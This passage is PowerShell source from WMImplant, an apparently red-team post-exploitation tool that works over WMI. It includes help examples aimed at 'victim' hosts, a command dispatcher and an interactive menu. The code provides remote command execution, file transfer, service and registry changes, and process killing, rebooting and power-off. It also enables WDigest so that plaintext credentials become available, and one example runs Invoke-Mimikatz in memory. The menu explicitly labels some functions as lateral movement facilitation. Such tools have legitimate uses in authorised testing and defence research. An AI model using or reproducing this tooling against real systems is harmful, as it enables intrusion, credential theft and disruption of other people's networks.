    This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
    
    .EXAMPLE
    > Invoke-WMImplant -PS -RemoteUser test\apple -RemotePass pass123 -Target hackerpc
    This command gets a process listing on the system "hackerpc" by authenticating as the apple user

    .EXAMPLE
    > Invoke-WMImplant -ProcessKill -ProcessID 1194 -Target sys3
    This command kills process id 1194 on the "sys3" system and authenticates with the current user's context

    .EXAMPLE
    > Invoke-WMImplant -ProcessKill -ProcessName systemexplorer.exe -Target win7 -RemoteUser internal\admin -RemotePass pass123
    This command kills the remote process "systemexplorer.exe" on the system "win7" and authenticates as the "admin" user.

    .EXAMPLE
    > Invoke-WMImplant -ProcessStart -RemoteFile notepad.exe -Target victimsys
    This command authenticates to the "victimsys" system under the current user's context and starts the process notepad.exe

    .EXAMPLE
    > Invoke-WMImplant -ProcessStart -RemoteFile C:\notabackdoor.exe -Target victim2 -RemoteUser inside\goodadmin -RemotePass pass222
    This command authenticates to the "victim2" system as the user "goodadmin" and runs the binary located at C:\notabackdoor.exe
    
    .EXAMPLE
    > Invoke-WMImplant -ActiveUsers -Target winadmin
    This command displays any user that has a process running on the "winadmin" system via the current user's context

    .EXAMPLE
    > Invoke-WMImplant -VacantSystem -Target victim9 -RemoteUser owned\chris -RemotePass badpass
    This command attempts to determine if a user is active at the "victim9" system by searching for active screensavers and a logon prompt and authenticates as the user "chris"
    
    .EXAMPLE
    > Invoke-WMImplant -DriveList -Target victim101
    This command authenticates to the victim101 system in the context of the current user and lists all drives connected to the system

    .EXAMPLE
    > Invoke-WMImplant -Reboot -Target victom3
    This command reboots the "victom3" system

    .EXAMPLE
    > Invoke-WMImplant -PowerOff -Target victim9 -RemoteUser domain\user -RemotePass pass123
    This command powers off the "victim9" and authenticates as the provided user and password.
    
    .EXAMPLE
    > Invoke-WMImplant -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
    This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM

    .EXAMPLE
    > Invoke-WMImplant -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -Target Win7user4
    This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
    #>

    [CmdletBinding(DefaultParameterSetName="Interactive")]

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False, ParameterSetName='Interactive')]
        [switch]$Interactive,
        [Parameter(Mandatory = $False, ParameterSetName='List Commands')]
        [switch]$ListCommands,
        [Parameter(Mandatory = $False)]
        [string]$RemoteUser,
        [Parameter(Mandatory = $False)]
        [string]$RemotePass,
        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
        [Parameter(ParameterSetName='Upload File')]
        [Parameter(ParameterSetName='Logon Events')]
        [string]$LocalFile,
        [Parameter(Mandatory = $False, ParameterSetName='Read File')]
        [Parameter(ParameterSetName='Upload File')]
        [Parameter(ParameterSetName='Download File')]
        [Parameter(ParameterSetName='File Search Name')]
        [Parameter(ParameterSetName='Process Start')]
        [string]$RemoteFile,
        [Parameter(ParameterSetName='Directory Listing')]
        [string]$RemoteDirectory,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
        [Parameter(ParameterSetName='File Search Extension')]
        [string]$RemoteDrive,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Extension')]
        [string]$RemoteExtension,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [string]$Target,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [string]$Function,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
        [string]$ProcessName,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill ID')]
        [int]$ProcessID,
        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
        [Parameter(ParameterSetName='Service Stop')]
        [Parameter(ParameterSetName='Service Create')]
        [Parameter(ParameterSetName='Service Delete')]
        [string]$ServiceName,
        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
        [switch]$ServiceStart,
        [Parameter(Mandatory = $False, ParameterSetName='Service Stop')]
        [switch]$ServiceStop,
        [Parameter(Mandatory = $False, ParameterSetName='Service Create')]
        [switch]$ServiceCreate,
        [Parameter(Mandatory = $False, ParameterSetName='Service Delete')]
        [switch]$ServiceDelete,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [string]$RegKey,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [string]$RegSubKey,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [string]$RegValue,
        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')] 
        [string]$RemoteCommand,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [switch]$KeyCreate,
        [Parameter(Mandatory = $False, ParameterSetName='Delete Reg Key')]
        [switch]$KeyDelete,
        [Parameter(Mandatory = $False, ParameterSetName='Read File')]
        [switch]$Cat,
        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
        [switch]$Download,
        [Parameter(Mandatory = $False, ParameterSetName='Directory Listing')]
        [switch]$LS,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
        [Parameter(Mandatory = $False, ParameterSetName='File Search Extension')]
        [switch]$Search,
        [Parameter(Mandatory = $False, ParameterSetName='Upload File')]
        [switch]$Upload,
        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')]
        [switch]$CommandExec,
        [Parameter(Mandatory = $False, ParameterSetName='Disable WDigest')]
        [switch]$DisableWdigest,
        [Parameter(Mandatory = $False, ParameterSetName='Disable WinRM')]
        [switch]$DisableWinRM,
        [Parameter(Mandatory = $False, ParameterSetName='Enable WDigest')]
        [switch]$EnableWdigest,
        [Parameter(Mandatory = $False, ParameterSetName='Enable WinRM')]
        [switch]$EnableWinRM,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [ValidateSet("hklm","hkcu","hkcr","hkusers","hkcurrentconfig")]
        [string]$RegHive,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [switch]$RemotePosh,
        [Parameter(Mandatory = $False, ParameterSetName='Set Default WMI Property')]
        [switch]$SetWMIDefault,
        [Parameter(Mandatory = $False, ParameterSetName='Process Listing')]
        [switch]$PS,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
        [Parameter(ParameterSetName='Process Kill ID')]
        [switch]$ProcessKill,
        [Parameter(Mandatory = $False, ParameterSetName='Process Start')]
        [switch]$ProcessStart,
        [Parameter(Mandatory = $False, ParameterSetName='List Active Users')]
        [switch]$ActiveUsers,
        [Parameter(Mandatory = $False, ParameterSetName='List Basic Info')]
        [switch]$BasicInfo,
        [Parameter(Mandatory = $False, ParameterSetName='Drive Listing')]
        [switch]$DriveList,
        [Parameter(Mandatory = $False, ParameterSetName='Active NIC Listing')]
        [switch]$IFConfig,
        [Parameter(Mandatory = $False, ParameterSetName='List Installed Programs')]
        [switch]$InstalledPrograms,
        [Parameter(Mandatory = $False, ParameterSetName='Identify Vacant System')]
        [switch]$VacantSystem,
        [Parameter(Mandatory = $False, ParameterSetName='Logon Events')]
        [switch]$LogonEvents,
        [Parameter(Mandatory = $False, ParameterSetName='Logoff Users')]
        [switch]$LogOff,
        [Parameter(Mandatory = $False, ParameterSetName='Reboot System')]
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [string]$Location,
        [Parameter(Mandatory = $False, ParameterSetName='Power Off System')]
        [switch]$PowerOff
    )

    Process
    {
        # Create the remote credential object that will be needed for EVERYTHING
        if($RemoteUser -and $RemotePass)
        {
            $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
            $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
        }

        if($Cat)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteFile)
            {
                Throw "You need to specify a file to read with the RemoteFile flag!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
                }

                else
                {
                    Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
                }
            }
        }

        elseif($Download)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteFile)
            {
                Throw "You need to specify a file to read with the RemoteFile flag!"
            }

            if(!$LocalFile)
            {
                Throw "You need to specify the location to save the file with the $LocalFile flag!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                }

                else
                {
                    Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
                }
            }
        }

        elseif($LS)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteDirectory)
            {
                Throw "Please provide the RemoteDirectory parameter to specify the directory to list!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteDirectory
                }

                else
                {
                    Invoke-LSWMImplant -Target $Computer -Directory $RemoteDirectory
                }
            }
        }

        elseif($Search)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteFile -and !$RemoteExtension)
            {
                Throw "Please provide the RemoteFile or RemoteExtension parameter to specify the file or extension to search for!"
            }

            if(!$RemoteDrive)
            {
                Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    if($RemoteFile)
                    {
                        Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
                    }
                    elseif($RemoteExtension)
                    {
                        Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
                    }
                }

                else
                {
                    if($RemoteFile)
                    {
                        Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
                    }
                    elseif($RemoteExtension)
                    {
                        Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
                    }
                }
            }
        }

        elseif($Upload)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$LocalFile)
            {
                Throw "Please use the LocalFile flag to specify the file to upload!"
            }

            if(!$RemoteFile)
            {
                Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
                }

                else
                {
                    Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
                }
            }
        }

        elseif($CommandExec)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteCommand)
            {
                Throw "You need to specify the command to run with the -Command!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
                }

                else
                {
                    Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
                }
            }
        }

        elseif($DisableWDigest)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Creds $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
                }

                else
                {
                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
                }
            }
        }

        elseif($DisableWinRM)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }
            }
        }

        elseif($EnableWdigest)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
                }

                else
                {
                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
                }
            }
        }

        elseif($EnableWinRM)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }
            }
        }

        elseif($KeyCreate)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RegHive)
            {
                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
            }

            if(!$RegKey)
            {
                Throw "You need to specify the registry key you will add or remove a value from!"
            }

            if(!$RegSubKey)
            {
                Throw "You need to specify the registry sub key you will add or remove a value from!"
            }

            if(!$RegValue)
            {
                Throw "Please provide the registry value you are looking to modify!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                }
                else
                {
                    Invoke-RegValueMod -Target $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                }
            }
        }

        elseif($KeyDelete)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RegHive)
            {
                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
            }

            if(!$RegKey)
            {
                Throw "You need to specify the registry key you will remove a value from!"
            }

            if(!$RegSubKey)
            {
                Throw "Please provide the registry sub key you are looking to delete!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                }
                else
                {
                    Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                }
            }
        }

        elseif($RemotePosh)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$Location)
            {
                Throw "You need to specify the Location flag to provide the file location where the script is!"
            }

            if(!$Function)
            {
                Throw "You need to specify the Function flag to provide the function to run on the remote system!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -Target $Computer
                }

                else
                {
                    Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -Target $Computer
                }
            }
        }

        elseif($ServiceStart)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to start!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
                }
                else
                {
                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
                }
            }
        }

        elseif($ServiceStop)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to stop!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
                }
                else
                {
                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
                }
            }
        }

        elseif($ServiceDelete)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to delete!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
                }
                else
                {
                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
                }
            }
        }

        elseif($ServiceCreate)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$ServiceName)
            {
                Throw "You need to specify the service name you want to create!"
            }

            if(!$RemoteFile)
            {
                Throw "You need to specify the path to the service binary for the service you are creating!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                }
                else
                {
                    Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                }
            }
        }
    

        elseif($SetWMIDefault)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Set-OriginalProperty -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Set-OriginalProperty -Target $Computer
                }
            }
        }

        elseif($PS)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Get-ProcessListingWMImplant -Target $Computer
                }
            }
        }

        elseif($ProcessKill)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$ProcessName -and !$ProcessID)
            {
                Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
            }

            Foreach($Computer in $Target)
            {

                if($RemoteCredential)
                {
                    if($ProcessName)
                    {
                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
                    }

                    elseif($ProcessID)
                    {
                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
                    }
                }

                else
                {
                    if($ProcessName)
                    {
                        Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
                    }

                    elseif($ProcessID)
                    {
                        Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
                    }
                }
            }
        }

        elseif($ProcessStart)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            if(!$RemoteFile)
            {
                Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
                }

                else
                {
                    Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
                }
            }
        }

        elseif($ActiveUsers)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Find-CurrentUsers -Target $Computer
                }
            }
        }

        elseif($BasicInfo)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-HostInfo -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Get-HostInfo -Target $Computer
                }
            }
        }

        elseif($DriveList)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Get-ComputerDrives -Target $Computer
                }
            }
        }

        elseif($IFConfig)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-NetworkCards -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Get-NetworkCards -Target $Computer
                }
            }
        }

        elseif($InstalledPrograms)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Get-InstalledPrograms -Target $Computer
                }
            }
        }

        elseif($VacantSystem)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Find-VacantComputer -Creds $RemoteCredential -Target $Computer
                }

                else
                {
                    Find-VacantComputer -Target $Computer
                }
            }
        }

        elseif($LogonEvents)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($LocalFile)
                {
                    if($RemoteCredential)
                    {
                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
                    }

                    else
                    {
                        Get-WMIEventLogins -Target $Computer -FileName $LocalFile
                    }
                }

                else
                {
                    if($RemoteCredential)
                    {
                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
                    }

                    else
                    {
                        Get-WMIEventLogins -Target $Computer
                    }
                }
            }
        }

        elseif($LogOff)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
                }

                else
                {
                    Invoke-PowerOptionsWMI -Target $Computer -Logoff
                }
            }
        }

        elseif($Reboot)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
                }

                else
                {
                    Invoke-PowerOptionsWMI -Target $Computer -Reboot
                }
            }
        }

        elseif($PowerOff)
        {
            if(!$Target)
            {
                Throw "You need to specify a target to run the command against!"
            }

            Foreach($Computer in $Target)
            {
                if($RemoteCredential)
                {
                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
                }

                else
                {
                    Invoke-PowerOptionsWMI -Target $Computer -Shutdown
                }
            }
        }

        elseif($ListCommands)
        {
            Show-WMImplantMainMenu
        }

        elseif($Interactive)
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }

        # I don't believe this should ever execute
        else
        {
            Show-WMImplantMainMenu
            Use-MenuSelection
        }
    }
}

function Select-UserAccount
{
    # Query user for user account and password to use
    $UserUsername = Read-Host "Please provide the domain\username to use for authentication >"
    $UserPassword = Read-Host "Please provide the password to use for authentication >"

    # This block of code is executed when starting a process on a remote machine via wmi
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    return $cred
}

function Show-WMImplantMainMenu
{
    # Print out commands available to the user
    $menu_options = "`nWMImplant Main Menu:`n`n"

    $menu_options += "Meta Functions:`n"
    $menu_options += "====================================================================`n"
    $menu_options += "change_user - Change the user used to connect to remote systems`n"
    $menu_options += "exit - Exit WMImplant`n"
    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant`n"
    $menu_options += "set_default - Set default value od DebugFilePath property`n"
    $menu_options += "help - Display this help/command menu`n`n"

    $menu_options += "File Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "cat - Attempt to read a file's contents`n"
    $menu_options += "download - Download a file from a remote machine`n"
    $menu_options += "ls - File/Directory listing of a specific directory`n"
    $menu_options += "search - Search for a file on a user-specified drive`n"
    $menu_options += "upload - Upload a file to a remote machine`n`n"

    $menu_options += "Lateral Movement Facilitation`n"
    $menu_options += "====================================================================`n"
    $menu_options += "command_exec - Run a command line command and get the output`n"
    $menu_options += "disable_wdigest - Remove registry value UseLogonCredential`n"
    $menu_options += "disable_winrm - Disable WinRM on the targeted host`n"
    $menu_options += "enable_wdigest - Add registry value UseLogonCredential`n"
    $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
    $menu_options += "registry_mod - Modify the registry on the targeted system`n"
    $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
    $menu_options += "service_mod - Create, delete, or modify services`n`n"

    $menu_options += "Process Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "process_kill - Kill a specific process`n"
    $menu_options += "process_start - Start a process on a remote machine`n"
    $menu_options += "ps - Process listing`n`n"
    
    $menu_options += "System Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "active_users - List domain users with active processes on a system`n"
    $menu_options += "basic_info - Gather hostname and other basic system info`n"
    $menu_options += "drive_list - List local and network drives`n"
    $menu_options += "ifconfig - IP information for NICs with IP addresses`n"
    $menu_options += "installed_programs - Receive a list of all programs installed`n"
    $menu_options += "logoff - Logs users off the specified system`n"
    $menu_options += "reboot - Reboot a system`n"
    $menu_options += "power_off - Power off a system`n"
    $menu_options += "vacant_system - Determine if a user is away from the system.`n`n"

    $menu_options += "Log Operations`n"
    $menu_options += "====================================================================`n"
    $menu_options += "logon_events - Identify users that have logged into a system`n`n"

    # Print the menu out to the user
    $menu_options
}

function Use-MenuSelection
{
    # This function is where the user provides the command they wish to execute
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $looping = $true
    while ($looping)
    {

        # Read in user's menu choice
        $menu_selection = Read-Host "Command >"
        $menu_selection = $menu_selection.Trim().ToLower()

        switch ($menu_selection)
        {
            "change_user"
            {
                $Credential = Select-UserAccount
            }

            "exit"
            {
                $looping = $false
            }

            "gen_cli"
            {
                Invoke-CommandGeneration
            }

            "set_default"
            {
                if ($Credential)
                {
                    Set-OriginalProperty -Creds $Credential
                }

                else
                {
                    Set-OriginalProperty
                }
            }

            "help"
            {
                Show-WMImplantMainMenu
            }

            "cat"
            {
                if ($Credential)
                {
                    Get-FileContentsWMImplant -Creds $Credential
                }

                else
                {
                    Get-FileContentsWMImplant
                }
            }

            "download"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Creds $Credential -Download
                }

                else
                {
                    Invoke-FileTransferWMImplant -Download
                }
            }

            "ls"
            {
                if ($Credential)
                {
                    Invoke-LSWMImplant -Creds $Credential
                }

                else
                {
                    Invoke-LSWMImplant
                }
            }

            "search"
            {
                if($Credential)
                {
                    Find-FileWMImplant -Creds $Credential
                }

                else
                {
                    Find-FileWMImplant    
                }

            }

            "upload"
            {
                if ($Credential)
                {
                    Invoke-FileTransferWMImplant -Creds $Credential -Upload
                }

                else
                {
                    Invoke-FileTransferWMImplant -Upload
                }
            }

            "command_exec"
            {
                if ($Credential)
                {
                    Invoke-CommandExecution -Creds $Credential
                }

                else
                {
                    Invoke-CommandExecution
                }
            }

            "disable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential'
                }

                else
                {
                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential'
                }
            }

            "disable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                }
            }

            "enable_wdigest"
            {
                if ($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '0x1'
                }

                else
                {
                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey UseLogonCredential -RegValue "0x1"
                }
            }

            "enable_winrm"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }

                else
                {
                    Invoke-ProcSpawn -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                }
            }

            "registry_mod"
            {
                if($Credential)
                {
                    Invoke-RegValueMod -Creds $Credential
                }
                else
                {
                    Invoke-RegValueMod
                }
            }

            "remote_posh"
            {
                if ($Credential)
                {
                    Invoke-RemoteScriptWithOutput -Creds $Credential
                }

                else
                {
                    Invoke-RemoteScriptWithOutput
                }
            }

            "service_mod"
            {
                if($Credential)
                {
                    Invoke-ServiceMod -Creds $Credential
                }
                else
                {
                    Invoke-ServiceMod
                }
            }
